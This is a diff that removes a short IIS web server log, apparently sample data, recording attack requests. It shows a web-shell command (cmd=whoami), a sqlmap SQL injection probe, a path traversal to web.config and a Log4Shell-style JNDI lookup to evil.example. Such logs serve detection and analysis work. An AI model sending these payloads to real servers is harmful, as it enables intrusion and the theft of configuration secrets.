@@ -1,8 +1,0 @@
-#Software: Microsoft Internet Information Services 10.0
-#Version: 1.0
-#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query c-ip cs-username cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
-2026-07-03 10:22:01 10.0.0.5 GET /upload/test.aspx cmd=whoami 185.10.20.30 - curl/8.0 - 200 0 0 45
-2026-07-03 10:23:14 10.0.0.5 GET /search.aspx q=%27%20or%201%3D1-- 185.10.20.30 - sqlmap/1.7 - 500 0 0 30
-2026-07-03 10:24:02 10.0.0.5 GET /download.aspx file=..%2f..%2fweb.config 185.10.20.30 - curl/8.0 - 200 0 0 12
-2026-07-03 10:25:33 10.0.0.5 GET /page.aspx x=%24%7bjndi%3aldap%3a%2f%2fevil.example%2fa%7d 203.0.113.7 - Mozilla/5.0 - 404 0 2 8
-2026-07-03 10:26:00 10.0.0.5 GET /index.html - 192.168.1.10 - Mozilla/5.0 - 200 0 0 3
